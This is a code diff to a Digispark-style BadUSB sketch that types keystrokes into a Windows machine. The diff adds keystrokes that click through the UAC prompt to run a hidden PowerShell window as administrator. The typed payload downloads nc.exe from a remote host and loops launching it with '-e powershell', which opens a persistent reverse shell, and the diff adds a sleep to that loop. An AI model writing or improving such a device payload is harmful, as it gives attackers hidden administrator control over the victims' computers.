@@ -26,12 +26,12 @@ const char CAFR[129] PROGMEM = "}#########\n##################### !@`$%&<()*+,->
 const unsigned int keyboardsLength = 2;
 const char* const keyboards[keyboardsLength] = {CAFR, US};
 
-const char STR0[] PROGMEM = "powershell -WindowStyle Hidden\n"; //"powershell\n";
+const char STR0[] PROGMEM = "powershell -WindowStyle Hidden"; //"powershell";
 const char STR1[] PROGMEM = "$p = \"$env:temp/nc.exe\";(New-Object System.Net.WebClient).DownloadFile(\"http://";
 const char STR2[] PROGMEM = ":";
 const char STR3[] PROGMEM = "/\", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList \"";
 const char STR4[] PROGMEM = "\",\"";
-const char STR5[] PROGMEM = "\",\"-e\",\"powershell\"}\n\n";
+const char STR5[] PROGMEM = "\",\"-e\",\"powershell\";sleep 1}\n\n";
 
 //smartPrint is a function to support many keyboard layouts
 void smartPrint(const char string[], int keyboard){
@@ -74,9 +74,14 @@ void setup() {
   //Windows+R
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   delay(300);
-  //open Powershell
+  //run Powershell as administrator
   //for some reason we can still type in a hidden Powershell window...
   smartPrint(STR0, 0);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+  delay(750);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  delay(250);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
   //type in the payload
   for(int k = 0; k < keyboardsLength; k++){
